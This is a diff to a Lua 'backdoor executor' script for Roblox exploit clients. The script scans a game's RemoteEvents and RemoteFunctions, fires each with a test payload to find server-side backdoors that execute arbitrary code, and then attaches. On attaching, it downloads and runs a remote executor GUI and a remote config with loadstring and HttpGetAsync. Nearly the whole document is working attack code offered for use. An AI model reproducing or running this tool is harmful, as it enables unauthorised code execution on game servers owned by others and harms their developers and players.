@@ -18,7 +18,7 @@ local eventInfo = {
 local msgOutputs = {
 	["attached"] = "\n Attached Event: %s\n Type: %s",
 	["printEvent"] = "\n Event: %s\n Type: %s",
-	["outdatedCache"] = "This game [%s] cache doesn't work, it might be outdated."
+	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated."
 }
 local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
 local scannedEvents = table.create(0)
@@ -44,17 +44,37 @@ end
 
 local function isRemoteAllowed(object)
 	if not object then return end
-	local objectFullName = object:GetFullName()
+	local objectPath = object:GetFullName()
 
-	if (config.blacklistSettings.eventNames[object.Name] or config.blacklistSettings.eventParentNames[object.Parent.Name]) or
-		table.find(scannedEvents, object:GetFullName()) or
-		(object:FindFirstChild("__FUNCTION") or object.Name == "__FUNCTION") or
-		string.find(objectFullName, "MouseInfo") or string.find(objectFullName, "HDAdminClient") or
-		string.find(objectFullName, "Basic Admin Essentials") or
-		object.Parent == game:GetService("RobloxReplicatedStorage") then
+	if (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) or
+		table.find(scannedEvents, objectPath) or
+		config.blacklistSettings.eventNames[object.Name] or
+		(object.Parent and config.blacklistSettings.eventParentNames[object.Parent.Name]) or
+		((object.Parent and object.Parent:IsA("ReplicatedStorage") and object:FindFirstChild("__FUNCTION")) or
+		(object.Name == "__FUNCTION" and object.Parent:IsA("RemoteEvent") and object.Parent.Parent:IsA("ReplicatedStorage"))) or
+		string.find(objectPath, "HDAdminClient") or string.find(objectPath, "Basic Admin Essentials") or
+		(object.Parent and object.Parent:IsA("RobloxReplicatedStorage"))
+	then
 		return false
 	end
 	return true
+end
+
+local function getRemotes()
+	local remotes = table.create(500)
+
+	for _, object in game:GetDescendants() do
+		if not isRemoteAllowed(object) then continue end
+		table.insert(remotes, object)
+	end
+
+	if getnilinstances then
+		for _, object in getnilinstances() do
+			if not isRemoteAllowed(object) then continue end
+			table.insert(remotes, object)
+		end
+	end
+	return remotes
 end
 
 local function getEventFunc(object)
@@ -68,16 +88,17 @@ local function getEventFunc(object)
 end
 
 local function execScript(source)
-	if eventInfo.instance then
-		local eventFunc = getEventFunc(eventInfo.instance)
-		eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)
+	if not eventInfo.foundBackdoor then return end
+	local eventFunc = getEventFunc(eventInfo.instance)
+	eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)
 
-		task.spawn(eventFunc, eventInfo.instance, unpack(eventInfo.args))
-	end
+	task.spawn(eventFunc, eventInfo.instance, unpack(eventInfo.args))
 end
 
-local function initializeEventObj(params)
-	if eventInfo.instance then return end
+local function initializeEventInfo(params)
+	if eventInfo.foundBackdoor then return end
+
+	eventInfo.foundBackdoor = true
 	for name, value in params do
 		eventInfo[name] = value
 	end
@@ -85,12 +106,12 @@ end
 
 local function onAttached(eventObj, params)
 	if not eventObj then return end
+	getgenv().__BACKDOOREXEATTACHED = true
 	print(string.format(msgOutputs.attached, eventObj:GetFullName(), eventObj.ClassName))
-	initializeEventObj(params or {
-		["foundBackdoor"] = true,
+	sendNotification("Attached!")
+	initializeEventInfo(params or {
 		["instance"] = eventObj,
 	})
-	sendNotification("Attached!")
 
 	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
 		customExecution = true,
@@ -102,24 +123,22 @@ local function onAttached(eventObj, params)
 end
 
 local function findBackdoors()
-	if eventInfo.instance then return end
+	if eventInfo.foundBackdoor then return end
 
-	for _, object in game:GetDescendants() do
-		if object:IsA("RemoteEvent") or object:IsA("RemoteFunction") then
-			if not isRemoteAllowed(object) then continue end
-			print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
-			local eventFunc, objectPath = getEventFunc(object), object:GetFullName()
-			pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))
+	for _, object in getRemotes() do
+		local eventFunc, objectPath = getEventFunc(object), object:GetFullName()
 
-			local execResult = workspace:FindFirstChild(game.PlaceId)
-			if execResult and execResult.Value ~= "" then
-				onAttached(pathToInstance(execResult.Value))
-				break
-			end
+		print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
+		pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))
 
-			table.insert(scannedEvents, objectPath)
-			task.wait()
+		local execResult = workspace:FindFirstChild(game.PlaceId)
+		if execResult and execResult.Value ~= "" then
+			onAttached(pathToInstance(execResult.Value))
+			break
 		end
+
+		table.insert(scannedEvents, objectPath)
+		task.wait()
 	end
 	table.clear(scannedEvents)
 end
@@ -132,39 +151,48 @@ do -- "initialization"?
 
 		if (not succ) then
 			sendNotification("Local configuration cannot be loaded, overwriting.")
-			local newConfigRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
+			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
 
-			writefile("bexe-config.lua", newConfigRaw)
-			loadedConfig = loadstring(newConfigRaw)()
+			writefile("bexe-config.lua", configRaw)
+			loadedConfig = loadstring(configRaw)()
 		end
 		config = loadedConfig
 	end
 end
 do -- backdoor finding
-	sendNotification("Press F9 to see the remotes being scanned.")
-	local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil
+	if not getgenv().__BACKDOOREXEATTACHED then
+		sendNotification("Press F9 to see the remotes being scanned.")
+		local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil
 
-	if placeCacheData then
-		local eventObj = pathToInstance(placeCacheData.Path)
+		if placeCacheData then
+			local successCount = 0
+			local eventObj = pathToInstance(placeCacheData.Path)
+			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))
 
-		if eventObj then
-			onAttached(eventObj, {
-				["foundBackdoor"] = true,
-				["instance"] = eventObj,
-				["srcFunc"] = placeCacheData.SourceFunc,
-				["args"] = placeCacheData.Args,
-				["argSrcIndex"] = table.find(placeCacheData.Args, "source")
-			})
-		else
-			warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
+			successCount += (if typeof(eventObj) == "Instance" then 1 else 0)
+			successCount += (if (successCount == 1 and (eventObj:IsA("RemoteEvent") or eventObj:IsA("RemoteFunction"))) then 1 else 0)
+			successCount += (if argSrcIndex then 1 else 0)
+
+			if successCount >= 3 then
+				onAttached(eventObj, {
+					["instance"] = eventObj,
+					["srcFunc"] = placeCacheData.SourceFunc,
+					["args"] = placeCacheData.Args,
+					["argSrcIndex"] = argSrcIndex
+				})
+			else
+				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
+			end
 		end
-	end
-	if (not placeCacheData or not eventInfo.foundBackdoor) then -- scan first
-		findBackdoors()
-	end
+		if (not placeCacheData or not eventInfo.foundBackdoor) then -- scan first
+			findBackdoors()
+		end
 
-	if not eventInfo.foundBackdoor then -- if no backdoor found
-		print("No backdoor(s) can be found here!")
-		sendNotification("No backdoor(s) can be found here!")
+		if not eventInfo.foundBackdoor then -- if no backdoor found
+			print("No backdoor(s) can be found here!")
+			sendNotification("No backdoor(s) can be found here!")
+		end
+	else
+		sendNotification("Already attached!")
 	end
 end
